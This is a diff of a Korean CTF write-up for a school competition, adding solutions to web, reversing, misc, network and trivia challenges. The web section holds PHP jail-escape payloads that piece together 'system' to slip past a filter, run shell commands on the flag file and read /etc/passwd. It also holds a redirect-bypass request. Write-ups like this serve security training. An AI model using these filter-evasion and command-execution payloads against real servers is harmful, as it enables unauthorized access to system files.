@@ -60,6 +60,8 @@ show_source(__FILE__);
 
 > http://dimitrust.oa.to:8080/trustctf/http_header/index.php?url=%00%00%00%00%00%00%00%00%00%00%00
 
+> requests.get("http://dimitrust.oa.to:8080/trustctf/http_header/?url=1",allow_redirects=False).text
+
 - TRUST{oh_can_you_bypass_it?}
 
 
@@ -134,6 +136,8 @@ show_source(__FILE__);
 > $array%20=%20array(%27sys%27,%20%27tem%27);%0a$get=implode("",$array);%0a$get("cat%20flagflagflagfalgfagflfagflagflagflag");
 
 > http://dimitrust.oa.to:8080/trustctf/jail/?code=$array%20=%20array(%27sys%27,%20%27tem%27);%0a$get=implode("",$array);%0a$get("cat%20flagflagflagfalgfagflfagflagflagflag");
+
+> http://dimitrust.oa.to:8080/trustctf/jail/?code=$a=aystem;$a[0]=s;$a("cat%20/etc/passwd");
 
 - FLAG{i think u r good at php}
 
@@ -441,3 +445,89 @@ int main()
 ```
 
 - TRUST{y0u_c4n_c0ding_with_C_0n_1inux!}
+
+# Rev
+
+## What is reversing? (TRUST) 100
+
+![rev_11](https://raw.githubusercontent.com/Circler-K/writeup/master/CTF/dimictf/image/rev1.PNG)  
+
+![rev_12](https://raw.githubusercontent.com/Circler-K/writeup/master/CTF/dimictf/image/rev11.PNG)
+
+- HxD로 보아도 보이고 디버거로 디버깅해도 보인다.
+
+- TRUST{you_are_good_at_reversing}
+
+## What is Reversing? what?(TRUST) 200
+
+> 리버싱은 뭘까여  
+ <s>마약입니다 .feat 한국디지털미디이고등학교 학생 한분</s>
+
+- 디버거로 디버깅하면
+![rev_2](https://raw.githubusercontent.com/Circler-K/writeup/master/CTF/dimictf/image/rev2.PNG)
+
+문자열 하나가 나온다.
+
+- 저 문자열을 입력하면 플래그가 나온다.
+
+
+# Misc
+
+## Hello CTF! 100
+- FLAG{Welcome_to_DIMIGO_and_STEALTH!!!!!}
+
+## 여기 짱이 누구야?1 (STEALTH) 100
+- FLAG{이동준}
+- stealth 동아리장을 찾아서 쓰면 된다.
+
+## 계산의 달인 (STEALTH) 100
+> 다음을 계산하여 10진수로 나타내시오.  
+0xdeadbeef ^ 0xdeadbeef  
+제출형식에 맞게 플래그를 제출해주세요!  
+제출형식 | FLAG{계산결과}  
+ex) FLAG{1234}  
+
+- 같은 값을 XOR연산하게되면 0이 된다.
+- FLAG{0}
+
+## 여기 짱이 누구야?2 (STEALTH) 100
+- TRUST 동아리장을 쓰면 된다.
+
+- FLAG{윤석찬}
+
+## Amaze
+
+
+## 엥 이게 뭐지?? (STEALTH) 200
+- docx파일을 하나 주는데 파일안에 하얀색으로 플래그가 써져있다.
+
+## Do you know what this means? (STEALTH) 100
+> WUXVWHDOWK
+
+- \-3씩 밀어주면
+
+> TRUSTEALTH
+- FLAG{TRUSTEALTH}
+
+## RGVjcnlwdCB0aGlzIHdvcmQ= (STEALTH) 100
+- 문제명을 base64로 디코딩하면 Decrypt this word이다.
+- Q0hJQ0tFTg== -> CHICKEN
+- FLAG{CHICKEN}
+
+# Net
+
+## dcinside(TRUST) 100
+- 패킷파일 열어보면 검색기록에 플래그를 검색한 기록이 있다.
+![net_flag_dc]()
+
+# Google
+
+## 토렌트 (STEALTH) 100
+> '이것'은 토렌트에 적용된 기술 또는 통신망이다.  
+또한, 블록체인에 적용되기도 했다.  
+상호 연결된 노드(피어)들이 서로 간에 자원을 공유하는 것을 일컫는 '이것'은 무엇일까??  
+제출형식에 맞게 제출해주세요. (영어는 모두 대문자로)  
+제출형식 | FLAG{이것}  
+ex) FLAG{EXAMPLE}  
+
+- FLAG{P2P}
